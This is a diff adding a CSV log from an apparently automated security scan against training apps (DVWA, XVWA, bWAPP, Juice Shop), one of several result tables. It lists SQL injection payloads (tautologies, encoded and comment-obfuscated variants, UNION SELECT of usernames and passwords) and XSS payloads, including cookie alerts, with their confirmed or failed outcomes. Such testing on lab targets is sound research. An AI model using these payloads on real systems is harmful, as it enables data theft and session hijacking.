@@ -1,0 +1,442 @@
+﻿RunId,Site,Category,Mode,Index,Payload,Status,Outcome,Confirmed,EvidenceCode,LocationHost,ElapsedMs,Error,TestedUtc
+table14_shared_rng_rule_only_20261019T024216Z,DVWA,SQL Injection,Basic,1,' OR 'a'='a,200,SQL_RESULT_DIFFERENTIAL,true,result_rows:6;baseline:2,,297,,2026-10-19T02:43:13.424514+00:00
+table14_shared_rng_rule_only_20261019T024216Z,DVWA,SQL Injection,Basic,2,' OR 'x'='x'--,200,SQL_ERROR_SIGNAL_UNCONFIRMED,false,sql_error_text,,63,,2026-10-19T02:43:13.193731+00:00
+table14_shared_rng_rule_only_20261019T024216Z,DVWA,SQL Injection,Basic,3,' OR ''=',200,SQL_RESULT_DIFFERENTIAL,true,result_rows:6;baseline:2,,94,,2026-10-19T02:43:13.225306+00:00
+table14_shared_rng_rule_only_20261019T024216Z,DVWA,SQL Injection,Basic,4,' OR 1=1#,200,SQL_RESULT_DIFFERENTIAL,true,result_rows:6;baseline:2,,78,,2026-10-19T02:43:13.213828+00:00
+table14_shared_rng_rule_only_20261019T024216Z,DVWA,SQL Injection,Basic,5,' AND 1=1--,200,SQL_ERROR_SIGNAL_UNCONFIRMED,false,sql_error_text,,94,,2026-10-19T02:43:13.234778+00:00
+table14_shared_rng_rule_only_20261019T024216Z,DVWA,SQL Injection,Basic,6,"' UNION SELECT username,password FROM users--",200,SQL_ERROR_SIGNAL_UNCONFIRMED,false,sql_error_text,,78,,2026-10-19T02:43:13.230479+00:00
+table14_shared_rng_rule_only_20261019T024216Z,DVWA,SQL Injection,Basic,7,' OR 1=1--,200,SQL_ERROR_SIGNAL_UNCONFIRMED,false,sql_error_text,,94,,2026-10-19T02:43:13.243171+00:00
+table14_shared_rng_rule_only_20261019T024216Z,DVWA,SQL Injection,Basic,8,' OR '1'='1,200,SQL_RESULT_DIFFERENTIAL,true,result_rows:6;baseline:2,,94,,2026-10-19T02:43:13.247710+00:00
+table14_shared_rng_rule_only_20261019T024216Z,DVWA,SQL Injection,Basic,9,' OR EXISTS(SELECT 1)--,200,SQL_ERROR_SIGNAL_UNCONFIRMED,false,sql_error_text,,78,,2026-10-19T02:43:13.280742+00:00
+table14_shared_rng_rule_only_20261019T024216Z,DVWA,SQL Injection,Basic,10,' UNION SELECT NULL--,200,SQL_ERROR_SIGNAL_UNCONFIRMED,false,sql_error_text,,79,,2026-10-19T02:43:13.291963+00:00
+table14_shared_rng_rule_only_20261019T024216Z,DVWA,SQL Injection,Advanced,1,'/**/OR/**/''=',200,SQL_RESULT_DIFFERENTIAL,true,result_rows:6;baseline:2,,78,,2026-10-19T02:43:13.303967+00:00
+table14_shared_rng_rule_only_20261019T024216Z,DVWA,SQL Injection,Advanced,2,'/**/AND/**/1=1--,200,SQL_ERROR_SIGNAL_UNCONFIRMED,false,sql_error_text,,78,,2026-10-19T02:43:13.310203+00:00
+table14_shared_rng_rule_only_20261019T024216Z,DVWA,SQL Injection,Advanced,3,'/**/OR/**/EXISTS(SELECT/**/1)--,200,SQL_ERROR_SIGNAL_UNCONFIRMED,false,sql_error_text,,78,,2026-10-19T02:43:13.314623+00:00
+table14_shared_rng_rule_only_20261019T024216Z,DVWA,SQL Injection,Advanced,4,'/**/OR/**/'x'='x'--,200,SQL_ERROR_SIGNAL_UNCONFIRMED,false,sql_error_text,,78,,2026-10-19T02:43:13.321964+00:00
+table14_shared_rng_rule_only_20261019T024216Z,DVWA,SQL Injection,Advanced,5,"'/**/UNION/**/SELECT/**/username,password/**/FROM/**/users--",200,SQL_ERROR_SIGNAL_UNCONFIRMED,false,sql_error_text,,78,,2026-10-19T02:43:13.326198+00:00
+table14_shared_rng_rule_only_20261019T024216Z,DVWA,SQL Injection,Advanced,6,'/**/OR/**/'1'='1,200,SQL_RESULT_DIFFERENTIAL,true,result_rows:6;baseline:2,,62,,2026-10-19T02:43:13.345829+00:00
+table14_shared_rng_rule_only_20261019T024216Z,DVWA,SQL Injection,Advanced,7,'/**/OR/**/1=1--,200,SQL_ERROR_SIGNAL_UNCONFIRMED,false,sql_error_text,,62,,2026-10-19T02:43:13.359181+00:00
+table14_shared_rng_rule_only_20261019T024216Z,DVWA,SQL Injection,Advanced,8,'/**/UNION/**/SELECT/**/NULL--,200,SQL_ERROR_SIGNAL_UNCONFIRMED,false,sql_error_text,,63,,2026-10-19T02:43:13.367243+00:00
+table14_shared_rng_rule_only_20261019T024216Z,DVWA,SQL Injection,Advanced,9,'/**/OR/**/'a'='a,200,SQL_RESULT_DIFFERENTIAL,true,result_rows:6;baseline:2,,63,,2026-10-19T02:43:13.371835+00:00
+table14_shared_rng_rule_only_20261019T024216Z,DVWA,SQL Injection,Advanced,10,'/**/OR/**/1=1#,200,SQL_RESULT_DIFFERENTIAL,true,result_rows:6;baseline:2,,63,,2026-10-19T02:43:13.378532+00:00
+table14_shared_rng_rule_only_20261019T024216Z,DVWA,SQL Injection,Evasion,1,%27%20OR%20%27a%27=%27a,200,SQL_RESULT_DIFFERENTIAL,true,result_rows:6;baseline:2,,62,,2026-10-19T02:43:13.386429+00:00
+table14_shared_rng_rule_only_20261019T024216Z,DVWA,SQL Injection,Evasion,2,%27%20OR%20%271%27=%271,200,SQL_RESULT_DIFFERENTIAL,true,result_rows:6;baseline:2,,62,,2026-10-19T02:43:13.390476+00:00
+table14_shared_rng_rule_only_20261019T024216Z,DVWA,SQL Injection,Evasion,3,%27%20OR%201=1--,200,SQL_ERROR_SIGNAL_UNCONFIRMED,false,sql_error_text,,63,,2026-10-19T02:43:13.400628+00:00
+table14_shared_rng_rule_only_20261019T024216Z,DVWA,SQL Injection,Evasion,4,%27%20AND%201=1--,200,SQL_ERROR_SIGNAL_UNCONFIRMED,false,sql_error_text,,47,,2026-10-19T02:43:13.406036+00:00
+table14_shared_rng_rule_only_20261019T024216Z,DVWA,SQL Injection,Evasion,5,"%27%20UNION%20SELECT%20username,password%20FROM%20users--",200,SQL_ERROR_SIGNAL_UNCONFIRMED,false,sql_error_text,,47,,2026-10-19T02:43:13.410791+00:00
+table14_shared_rng_rule_only_20261019T024216Z,DVWA,SQL Injection,Evasion,6,%27%20OR%20EXISTS(SELECT%201)--,200,SQL_ERROR_SIGNAL_UNCONFIRMED,false,sql_error_text,,62,,2026-10-19T02:43:13.440561+00:00
+table14_shared_rng_rule_only_20261019T024216Z,DVWA,SQL Injection,Evasion,7,%27%20OR%20%27%27=%27,200,SQL_RESULT_DIFFERENTIAL,true,result_rows:6;baseline:2,,78,,2026-10-19T02:43:13.449488+00:00
+table14_shared_rng_rule_only_20261019T024216Z,DVWA,SQL Injection,Evasion,8,%27%20UNION%20SELECT%20NULL--,200,SQL_ERROR_SIGNAL_UNCONFIRMED,false,sql_error_text,,63,,2026-10-19T02:43:13.453353+00:00
+table14_shared_rng_rule_only_20261019T024216Z,DVWA,SQL Injection,Evasion,9,%27%20OR%201=1#,200,SQL_RESULT_DIFFERENTIAL,true,result_rows:6;baseline:2,,78,,2026-10-19T02:43:13.458626+00:00
+table14_shared_rng_rule_only_20261019T024216Z,DVWA,SQL Injection,Evasion,10,%27%20OR%20%27x%27=%27x%27--,200,SQL_ERROR_SIGNAL_UNCONFIRMED,false,sql_error_text,,62,,2026-10-19T02:43:13.462607+00:00
+table14_shared_rng_rule_only_20261019T024216Z,XVWA,SQL Injection,Basic,1,' OR 'a'='a,200,SQL_RESULT_DIFFERENTIAL,true,result_rows:10;baseline:0,,187,,2026-10-19T02:43:13.590123+00:00
+table14_shared_rng_rule_only_20261019T024216Z,XVWA,SQL Injection,Basic,2,' OR 'x'='x'--,200,SQL_ERROR_SIGNAL_UNCONFIRMED,false,sql_error_text,,312,,2026-10-19T02:43:13.735412+00:00
+table14_shared_rng_rule_only_20261019T024216Z,XVWA,SQL Injection,Basic,3,' OR ''=',200,SQL_RESULT_DIFFERENTIAL,true,result_rows:10;baseline:0,,63,,2026-10-19T02:43:13.489917+00:00
+table14_shared_rng_rule_only_20261019T024216Z,XVWA,SQL Injection,Basic,4,' OR 1=1#,200,SQL_RESULT_DIFFERENTIAL,true,result_rows:10;baseline:0,,63,,2026-10-19T02:43:13.497283+00:00
+table14_shared_rng_rule_only_20261019T024216Z,XVWA,SQL Injection,Basic,5,' AND 1=1--,200,SQL_ERROR_SIGNAL_UNCONFIRMED,false,sql_error_text,,62,,2026-10-19T02:43:13.509266+00:00
+table14_shared_rng_rule_only_20261019T024216Z,XVWA,SQL Injection,Basic,6,"' UNION SELECT username,password FROM users--",200,SQL_ERROR_SIGNAL_UNCONFIRMED,false,sql_error_text,,328,,2026-10-19T02:43:13.774930+00:00
+table14_shared_rng_rule_only_20261019T024216Z,XVWA,SQL Injection,Basic,7,' OR 1=1--,200,SQL_ERROR_SIGNAL_UNCONFIRMED,false,sql_error_text,,47,,2026-10-19T02:43:13.509788+00:00
+table14_shared_rng_rule_only_20261019T024216Z,XVWA,SQL Injection,Basic,8,' OR '1'='1,200,SQL_RESULT_DIFFERENTIAL,true,result_rows:10;baseline:0,,313,,2026-10-19T02:43:13.785481+00:00
+table14_shared_rng_rule_only_20261019T024216Z,XVWA,SQL Injection,Basic,9,' OR EXISTS(SELECT 1)--,200,SQL_ERROR_SIGNAL_UNCONFIRMED,false,sql_error_text,,15,,2026-10-19T02:43:13.515979+00:00
+table14_shared_rng_rule_only_20261019T024216Z,XVWA,SQL Injection,Basic,10,' UNION SELECT NULL--,200,SQL_ERROR_SIGNAL_UNCONFIRMED,false,sql_error_text,,328,,2026-10-19T02:43:13.822725+00:00
+table14_shared_rng_rule_only_20261019T024216Z,XVWA,SQL Injection,Advanced,1,'/**/OR/**/''=',200,SQL_RESULT_DIFFERENTIAL,true,result_rows:10;baseline:0,,31,,2026-10-19T02:43:13.859874+00:00
+table14_shared_rng_rule_only_20261019T024216Z,XVWA,SQL Injection,Advanced,2,'/**/AND/**/1=1--,200,SQL_ERROR_SIGNAL_UNCONFIRMED,false,sql_error_text,,47,,2026-10-19T02:43:13.872632+00:00
+table14_shared_rng_rule_only_20261019T024216Z,XVWA,SQL Injection,Advanced,3,'/**/OR/**/EXISTS(SELECT/**/1)--,200,SQL_ERROR_SIGNAL_UNCONFIRMED,false,sql_error_text,,47,,2026-10-19T02:43:13.877702+00:00
+table14_shared_rng_rule_only_20261019T024216Z,XVWA,SQL Injection,Advanced,4,'/**/OR/**/'x'='x'--,200,SQL_ERROR_SIGNAL_UNCONFIRMED,false,sql_error_text,,63,,2026-10-19T02:43:13.897379+00:00
+table14_shared_rng_rule_only_20261019T024216Z,XVWA,SQL Injection,Advanced,5,"'/**/UNION/**/SELECT/**/username,password/**/FROM/**/users--",200,SQL_ERROR_SIGNAL_UNCONFIRMED,false,sql_error_text,,63,,2026-10-19T02:43:13.897379+00:00
+table14_shared_rng_rule_only_20261019T024216Z,XVWA,SQL Injection,Advanced,6,'/**/OR/**/'1'='1,200,SQL_RESULT_DIFFERENTIAL,true,result_rows:10;baseline:0,,79,,2026-10-19T02:43:13.911115+00:00
+table14_shared_rng_rule_only_20261019T024216Z,XVWA,SQL Injection,Advanced,7,'/**/OR/**/1=1--,200,SQL_ERROR_SIGNAL_UNCONFIRMED,false,sql_error_text,,344,,2026-10-19T02:43:14.176911+00:00
+table14_shared_rng_rule_only_20261019T024216Z,XVWA,SQL Injection,Advanced,8,'/**/UNION/**/SELECT/**/NULL--,200,SQL_ERROR_SIGNAL_UNCONFIRMED,false,sql_error_text,,328,,2026-10-19T02:43:14.176389+00:00
+table14_shared_rng_rule_only_20261019T024216Z,XVWA,SQL Injection,Advanced,9,'/**/OR/**/'a'='a,200,SQL_RESULT_DIFFERENTIAL,true,result_rows:10;baseline:0,,63,,2026-10-19T02:43:13.916459+00:00
+table14_shared_rng_rule_only_20261019T024216Z,XVWA,SQL Injection,Advanced,10,'/**/OR/**/1=1#,200,SQL_RESULT_DIFFERENTIAL,true,result_rows:10;baseline:0,,62,,2026-10-19T02:43:13.928708+00:00
+table14_shared_rng_rule_only_20261019T024216Z,XVWA,SQL Injection,Evasion,1,%27%20OR%20%27a%27=%27a,200,SQL_RESULT_DIFFERENTIAL,true,result_rows:10;baseline:0,,62,,2026-10-19T02:43:13.937545+00:00
+table14_shared_rng_rule_only_20261019T024216Z,XVWA,SQL Injection,Evasion,2,%27%20OR%20%271%27=%271,200,SQL_RESULT_DIFFERENTIAL,true,result_rows:10;baseline:0,,47,,2026-10-19T02:43:13.945403+00:00
+table14_shared_rng_rule_only_20261019T024216Z,XVWA,SQL Injection,Evasion,3,%27%20OR%201=1--,200,SQL_ERROR_SIGNAL_UNCONFIRMED,false,sql_error_text,,47,,2026-10-19T02:43:13.950895+00:00
+table14_shared_rng_rule_only_20261019T024216Z,XVWA,SQL Injection,Evasion,4,%27%20AND%201=1--,200,SQL_ERROR_SIGNAL_UNCONFIRMED,false,sql_error_text,,46,,2026-10-19T02:43:13.958571+00:00
+table14_shared_rng_rule_only_20261019T024216Z,XVWA,SQL Injection,Evasion,5,"%27%20UNION%20SELECT%20username,password%20FROM%20users--",200,SQL_ERROR_SIGNAL_UNCONFIRMED,false,sql_error_text,,46,,2026-10-19T02:43:13.969661+00:00
+table14_shared_rng_rule_only_20261019T024216Z,XVWA,SQL Injection,Evasion,6,%27%20OR%20EXISTS(SELECT%201)--,200,SQL_ERROR_SIGNAL_UNCONFIRMED,false,sql_error_text,,47,,2026-10-19T02:43:13.980640+00:00
+table14_shared_rng_rule_only_20261019T024216Z,XVWA,SQL Injection,Evasion,7,%27%20OR%20%27%27=%27,200,SQL_RESULT_DIFFERENTIAL,true,result_rows:10;baseline:0,,47,,2026-10-19T02:43:13.986837+00:00
+table14_shared_rng_rule_only_20261019T024216Z,XVWA,SQL Injection,Evasion,8,%27%20UNION%20SELECT%20NULL--,200,SQL_ERROR_SIGNAL_UNCONFIRMED,false,sql_error_text,,47,,2026-10-19T02:43:13.991079+00:00
+table14_shared_rng_rule_only_20261019T024216Z,XVWA,SQL Injection,Evasion,9,%27%20OR%201=1#,200,SQL_RESULT_DIFFERENTIAL,true,result_rows:10;baseline:0,,47,,2026-10-19T02:43:13.998849+00:00
+table14_shared_rng_rule_only_20261019T024216Z,XVWA,SQL Injection,Evasion,10,%27%20OR%20%27x%27=%27x%27--,200,SQL_ERROR_SIGNAL_UNCONFIRMED,false,sql_error_text,,47,,2026-10-19T02:43:14.017747+00:00
+table14_shared_rng_rule_only_20261019T024216Z,bWAPP,SQL Injection,Basic,1,' OR 'a'='a,200,NO_CONFIRMATION_SIGNAL,false,,,219,,2026-10-19T02:43:14.178631+00:00
+table14_shared_rng_rule_only_20261019T024216Z,bWAPP,SQL Injection,Basic,2,' OR 'x'='x'--,200,NO_CONFIRMATION_SIGNAL,false,,,47,,2026-10-19T02:43:14.029999+00:00
+table14_shared_rng_rule_only_20261019T024216Z,bWAPP,SQL Injection,Basic,3,' OR ''=',200,NO_CONFIRMATION_SIGNAL,false,,,47,,2026-10-19T02:43:14.034175+00:00
+table14_shared_rng_rule_only_20261019T024216Z,bWAPP,SQL Injection,Basic,4,' OR 1=1#,200,NO_CONFIRMATION_SIGNAL,false,,,47,,2026-10-19T02:43:14.039598+00:00
+table14_shared_rng_rule_only_20261019T024216Z,bWAPP,SQL Injection,Basic,5,' AND 1=1--,200,NO_CONFIRMATION_SIGNAL,false,,,47,,2026-10-19T02:43:14.047696+00:00
+table14_shared_rng_rule_only_20261019T024216Z,bWAPP,SQL Injection,Basic,6,"' UNION SELECT username,password FROM users--",200,NO_CONFIRMATION_SIGNAL,false,,,63,,2026-10-19T02:43:14.067711+00:00
+table14_shared_rng_rule_only_20261019T024216Z,bWAPP,SQL Injection,Basic,7,' OR 1=1--,200,NO_CONFIRMATION_SIGNAL,false,,,47,,2026-10-19T02:43:14.077185+00:00
+table14_shared_rng_rule_only_20261019T024216Z,bWAPP,SQL Injection,Basic,8,' OR '1'='1,200,NO_CONFIRMATION_SIGNAL,false,,,47,,2026-10-19T02:43:14.082106+00:00
+table14_shared_rng_rule_only_20261019T024216Z,bWAPP,SQL Injection,Basic,9,' OR EXISTS(SELECT 1)--,200,NO_CONFIRMATION_SIGNAL,false,,,46,,2026-10-19T02:43:14.086720+00:00
+table14_shared_rng_rule_only_20261019T024216Z,bWAPP,SQL Injection,Basic,10,' UNION SELECT NULL--,200,NO_CONFIRMATION_SIGNAL,false,,,46,,2026-10-19T02:43:14.095843+00:00
+table14_shared_rng_rule_only_20261019T024216Z,bWAPP,SQL Injection,Advanced,1,'/**/OR/**/''=',200,NO_CONFIRMATION_SIGNAL,false,,,47,,2026-10-19T02:43:14.118786+00:00
+table14_shared_rng_rule_only_20261019T024216Z,bWAPP,SQL Injection,Advanced,2,'/**/AND/**/1=1--,200,NO_CONFIRMATION_SIGNAL,false,,,47,,2026-10-19T02:43:14.123395+00:00
+table14_shared_rng_rule_only_20261019T024216Z,bWAPP,SQL Injection,Advanced,3,'/**/OR/**/EXISTS(SELECT/**/1)--,200,NO_CONFIRMATION_SIGNAL,false,,,47,,2026-10-19T02:43:14.128602+00:00
+table14_shared_rng_rule_only_20261019T024216Z,bWAPP,SQL Injection,Advanced,4,'/**/OR/**/'x'='x'--,200,NO_CONFIRMATION_SIGNAL,false,,,47,,2026-10-19T02:43:14.132814+00:00
+table14_shared_rng_rule_only_20261019T024216Z,bWAPP,SQL Injection,Advanced,5,"'/**/UNION/**/SELECT/**/username,password/**/FROM/**/users--",200,NO_CONFIRMATION_SIGNAL,false,,,47,,2026-10-19T02:43:14.137139+00:00
+table14_shared_rng_rule_only_20261019T024216Z,bWAPP,SQL Injection,Advanced,6,'/**/OR/**/'1'='1,200,NO_CONFIRMATION_SIGNAL,false,,,31,,2026-10-19T02:43:14.148067+00:00
+table14_shared_rng_rule_only_20261019T024216Z,bWAPP,SQL Injection,Advanced,7,'/**/OR/**/1=1--,200,NO_CONFIRMATION_SIGNAL,false,,,31,,2026-10-19T02:43:14.149749+00:00
+table14_shared_rng_rule_only_20261019T024216Z,bWAPP,SQL Injection,Advanced,8,'/**/UNION/**/SELECT/**/NULL--,200,NO_CONFIRMATION_SIGNAL,false,,,31,,2026-10-19T02:43:14.154797+00:00
+table14_shared_rng_rule_only_20261019T024216Z,bWAPP,SQL Injection,Advanced,9,'/**/OR/**/'a'='a,200,NO_CONFIRMATION_SIGNAL,false,,,328,,2026-10-19T02:43:14.466160+00:00
+table14_shared_rng_rule_only_20261019T024216Z,bWAPP,SQL Injection,Advanced,10,'/**/OR/**/1=1#,200,NO_CONFIRMATION_SIGNAL,false,,,328,,2026-10-19T02:43:14.466160+00:00
+table14_shared_rng_rule_only_20261019T024216Z,bWAPP,SQL Injection,Evasion,1,%27%20OR%20%27a%27=%27a,200,NO_CONFIRMATION_SIGNAL,false,,,32,,2026-10-19T02:43:14.502039+00:00
+table14_shared_rng_rule_only_20261019T024216Z,bWAPP,SQL Injection,Evasion,2,%27%20OR%20%271%27=%271,200,NO_CONFIRMATION_SIGNAL,false,,,47,,2026-10-19T02:43:14.516241+00:00
+table14_shared_rng_rule_only_20261019T024216Z,bWAPP,SQL Injection,Evasion,3,%27%20OR%201=1--,200,NO_CONFIRMATION_SIGNAL,false,,,47,,2026-10-19T02:43:14.523725+00:00
+table14_shared_rng_rule_only_20261019T024216Z,bWAPP,SQL Injection,Evasion,4,%27%20AND%201=1--,200,NO_CONFIRMATION_SIGNAL,false,,,47,,2026-10-19T02:43:14.527489+00:00
+table14_shared_rng_rule_only_20261019T024216Z,bWAPP,SQL Injection,Evasion,5,"%27%20UNION%20SELECT%20username,password%20FROM%20users--",200,NO_CONFIRMATION_SIGNAL,false,,,344,,2026-10-19T02:43:14.823463+00:00
+table14_shared_rng_rule_only_20261019T024216Z,bWAPP,SQL Injection,Evasion,6,%27%20OR%20EXISTS(SELECT%201)--,200,NO_CONFIRMATION_SIGNAL,false,,,344,,2026-10-19T02:43:14.825882+00:00
+table14_shared_rng_rule_only_20261019T024216Z,bWAPP,SQL Injection,Evasion,7,%27%20OR%20%27%27=%27,200,NO_CONFIRMATION_SIGNAL,false,,,328,,2026-10-19T02:43:14.825882+00:00
+table14_shared_rng_rule_only_20261019T024216Z,bWAPP,SQL Injection,Evasion,8,%27%20UNION%20SELECT%20NULL--,200,NO_CONFIRMATION_SIGNAL,false,,,328,,2026-10-19T02:43:14.825882+00:00
+table14_shared_rng_rule_only_20261019T024216Z,bWAPP,SQL Injection,Evasion,9,%27%20OR%201=1#,200,NO_CONFIRMATION_SIGNAL,false,,,47,,2026-10-19T02:43:14.536238+00:00
+table14_shared_rng_rule_only_20261019T024216Z,bWAPP,SQL Injection,Evasion,10,%27%20OR%20%27x%27=%27x%27--,200,NO_CONFIRMATION_SIGNAL,false,,,32,,2026-10-19T02:43:14.541074+00:00
+table14_shared_rng_rule_only_20261019T024216Z,DVWA,XSS,Basic,1,<iframe src=javascript:alert(1)>,200,JAVASCRIPT_DIALOG_CONFIRMED,true,browser_dialog_event,,312,,2026-10-19T02:42:51.593441+00:00
+table14_shared_rng_rule_only_20261019T024216Z,DVWA,XSS,Basic,2,<body onload=alert(1)>,200,JAVASCRIPT_DIALOG_CONFIRMED,true,browser_dialog_event,,188,,2026-10-19T02:42:51.773880+00:00
+table14_shared_rng_rule_only_20261019T024216Z,DVWA,XSS,Basic,3,<svg onload=alert(1)>,200,JAVASCRIPT_DIALOG_CONFIRMED,true,browser_dialog_event,,187,,2026-10-19T02:42:51.967315+00:00
+table14_shared_rng_rule_only_20261019T024216Z,DVWA,XSS,Basic,4,<script>confirm(1)</script>,200,JAVASCRIPT_DIALOG_CONFIRMED,true,browser_dialog_event,,172,,2026-10-19T02:42:52.141624+00:00
+table14_shared_rng_rule_only_20261019T024216Z,DVWA,XSS,Basic,5,<script>alert(1)</script>,200,JAVASCRIPT_DIALOG_CONFIRMED,true,browser_dialog_event,,172,,2026-10-19T02:42:52.316574+00:00
+table14_shared_rng_rule_only_20261019T024216Z,DVWA,XSS,Basic,6,<img src=x onerror=alert(1)>,200,JAVASCRIPT_DIALOG_CONFIRMED,true,browser_dialog_event,,188,,2026-10-19T02:42:52.498935+00:00
+table14_shared_rng_rule_only_20261019T024216Z,DVWA,XSS,Basic,7,<script>prompt(1)</script>,200,JAVASCRIPT_DIALOG_CONFIRMED,true,browser_dialog_event,,172,,2026-10-19T02:42:52.673904+00:00
+table14_shared_rng_rule_only_20261019T024216Z,DVWA,XSS,Basic,8,<svg onload=confirm(1)>,200,JAVASCRIPT_DIALOG_CONFIRMED,true,browser_dialog_event,,187,,2026-10-19T02:42:52.856967+00:00
+table14_shared_rng_rule_only_20261019T024216Z,DVWA,XSS,Basic,9,<script>alert(document.cookie)</script>,200,JAVASCRIPT_DIALOG_CONFIRMED,true,browser_dialog_event,,172,,2026-10-19T02:42:53.023990+00:00
+table14_shared_rng_rule_only_20261019T024216Z,DVWA,XSS,Basic,10,<img src=x onerror=confirm(1)>,200,JAVASCRIPT_DIALOG_CONFIRMED,true,browser_dialog_event,,156,,2026-10-19T02:42:53.189459+00:00
+table14_shared_rng_rule_only_20261019T024216Z,DVWA,XSS,Advanced,1,<img src=x onerror=alert(1)>,200,JAVASCRIPT_DIALOG_CONFIRMED,true,browser_dialog_event,,188,,2026-10-19T02:42:53.364154+00:00
+table14_shared_rng_rule_only_20261019T024216Z,DVWA,XSS,Advanced,2,<script>confirm(1)</script>,200,JAVASCRIPT_DIALOG_CONFIRMED,true,browser_dialog_event,,172,,2026-10-19T02:42:53.545774+00:00
+table14_shared_rng_rule_only_20261019T024216Z,DVWA,XSS,Advanced,3,<img src=x onerror=confirm(1)>,200,JAVASCRIPT_DIALOG_CONFIRMED,true,browser_dialog_event,,171,,2026-10-19T02:42:53.712460+00:00
+table14_shared_rng_rule_only_20261019T024216Z,DVWA,XSS,Advanced,4,<svg onload=alert(1)>,200,JAVASCRIPT_DIALOG_CONFIRMED,true,browser_dialog_event,,172,,2026-10-19T02:42:53.894581+00:00
+table14_shared_rng_rule_only_20261019T024216Z,DVWA,XSS,Advanced,5,<script>alert(1)</script>,200,JAVASCRIPT_DIALOG_CONFIRMED,true,browser_dialog_event,,156,,2026-10-19T02:42:54.062896+00:00
+table14_shared_rng_rule_only_20261019T024216Z,DVWA,XSS,Advanced,6,<iframe src=javascript:alert(1)>,200,JAVASCRIPT_DIALOG_CONFIRMED,true,browser_dialog_event,,156,,2026-10-19T02:42:54.221234+00:00
+table14_shared_rng_rule_only_20261019T024216Z,DVWA,XSS,Advanced,7,<script>prompt(1)</script>,200,JAVASCRIPT_DIALOG_CONFIRMED,true,browser_dialog_event,,172,,2026-10-19T02:42:54.379724+00:00
+table14_shared_rng_rule_only_20261019T024216Z,DVWA,XSS,Advanced,8,<script>alert(document.cookie)</script>,200,JAVASCRIPT_DIALOG_CONFIRMED,true,browser_dialog_event,,172,,2026-10-19T02:42:54.562311+00:00
+table14_shared_rng_rule_only_20261019T024216Z,DVWA,XSS,Advanced,9,<svg onload=confirm(1)>,200,JAVASCRIPT_DIALOG_CONFIRMED,true,browser_dialog_event,,203,,2026-10-19T02:42:54.763638+00:00
+table14_shared_rng_rule_only_20261019T024216Z,DVWA,XSS,Advanced,10,<body onload=alert(1)>,200,JAVASCRIPT_DIALOG_CONFIRMED,true,browser_dialog_event,,203,,2026-10-19T02:42:54.961313+00:00
+table14_shared_rng_rule_only_20261019T024216Z,DVWA,XSS,Evasion,1,%3Cimg%20src=x%20onerror=alert(1)%3E,200,JAVASCRIPT_DIALOG_CONFIRMED,true,browser_dialog_event,,157,,2026-10-19T02:42:55.127780+00:00
+table14_shared_rng_rule_only_20261019T024216Z,DVWA,XSS,Evasion,2,%3Cimg%20src=x%20onerror=confirm(1)%3E,200,JAVASCRIPT_DIALOG_CONFIRMED,true,browser_dialog_event,,172,,2026-10-19T02:42:55.294162+00:00
+table14_shared_rng_rule_only_20261019T024216Z,DVWA,XSS,Evasion,3,%3Csvg%20onload=alert(1)%3E,200,JAVASCRIPT_DIALOG_CONFIRMED,true,browser_dialog_event,,187,,2026-10-19T02:42:55.475772+00:00
+table14_shared_rng_rule_only_20261019T024216Z,DVWA,XSS,Evasion,4,%3Ciframe%20src=javascript:alert(1)%3E,200,JAVASCRIPT_DIALOG_CONFIRMED,true,browser_dialog_event,,156,,2026-10-19T02:42:55.642129+00:00
+table14_shared_rng_rule_only_20261019T024216Z,DVWA,XSS,Evasion,5,%3Cscript%3Ealert(document.cookie)%3C/script%3E,200,JAVASCRIPT_DIALOG_CONFIRMED,true,browser_dialog_event,,188,,2026-10-19T02:42:55.818918+00:00
+table14_shared_rng_rule_only_20261019T024216Z,DVWA,XSS,Evasion,6,%3Csvg%20onload=confirm(1)%3E,200,JAVASCRIPT_DIALOG_CONFIRMED,true,browser_dialog_event,,172,,2026-10-19T02:42:55.992703+00:00
+table14_shared_rng_rule_only_20261019T024216Z,DVWA,XSS,Evasion,7,%3Cscript%3Econfirm(1)%3C/script%3E,200,JAVASCRIPT_DIALOG_CONFIRMED,true,browser_dialog_event,,156,,2026-10-19T02:42:56.159328+00:00
+table14_shared_rng_rule_only_20261019T024216Z,DVWA,XSS,Evasion,8,%3Cscript%3Eprompt(1)%3C/script%3E,200,JAVASCRIPT_DIALOG_CONFIRMED,true,browser_dialog_event,,172,,2026-10-19T02:42:56.326076+00:00
+table14_shared_rng_rule_only_20261019T024216Z,DVWA,XSS,Evasion,9,%3Cbody%20onload=alert(1)%3E,200,JAVASCRIPT_DIALOG_CONFIRMED,true,browser_dialog_event,,172,,2026-10-19T02:42:56.492258+00:00
+table14_shared_rng_rule_only_20261019T024216Z,DVWA,XSS,Evasion,10,%3Cscript%3Ealert(1)%3C/script%3E,200,JAVASCRIPT_DIALOG_CONFIRMED,true,browser_dialog_event,,156,,2026-10-19T02:42:56.658226+00:00
+table14_shared_rng_rule_only_20261019T024216Z,OWASP_Juice_Shop,XSS,Basic,1,<iframe src=javascript:alert(1)>,200,NO_CONFIRMATION_SIGNAL,false,no_dialog_or_reflection,,812,,2026-10-19T02:42:57.474651+00:00
+table14_shared_rng_rule_only_20261019T024216Z,OWASP_Juice_Shop,XSS,Basic,2,<body onload=alert(1)>,0,NO_CONFIRMATION_SIGNAL,false,no_dialog_or_reflection,,125,,2026-10-19T02:42:57.600046+00:00
+table14_shared_rng_rule_only_20261019T024216Z,OWASP_Juice_Shop,XSS,Basic,3,<svg onload=alert(1)>,0,NO_CONFIRMATION_SIGNAL,false,no_dialog_or_reflection,,94,,2026-10-19T02:42:57.702591+00:00
+table14_shared_rng_rule_only_20261019T024216Z,OWASP_Juice_Shop,XSS,Basic,4,<script>confirm(1)</script>,0,NO_CONFIRMATION_SIGNAL,false,no_dialog_or_reflection,,109,,2026-10-19T02:42:57.804399+00:00
+table14_shared_rng_rule_only_20261019T024216Z,OWASP_Juice_Shop,XSS,Basic,5,<script>alert(1)</script>,0,NO_CONFIRMATION_SIGNAL,false,no_dialog_or_reflection,,110,,2026-10-19T02:42:57.912690+00:00
+table14_shared_rng_rule_only_20261019T024216Z,OWASP_Juice_Shop,XSS,Basic,6,<img src=x onerror=alert(1)>,0,JAVASCRIPT_DIALOG_CONFIRMED,true,browser_dialog_event,,93,,2026-10-19T02:42:58.014677+00:00
+table14_shared_rng_rule_only_20261019T024216Z,OWASP_Juice_Shop,XSS,Basic,7,<script>prompt(1)</script>,0,NO_CONFIRMATION_SIGNAL,false,no_dialog_or_reflection,,110,,2026-10-19T02:42:58.114571+00:00
+table14_shared_rng_rule_only_20261019T024216Z,OWASP_Juice_Shop,XSS,Basic,8,<svg onload=confirm(1)>,0,NO_CONFIRMATION_SIGNAL,false,no_dialog_or_reflection,,93,,2026-10-19T02:42:58.214374+00:00
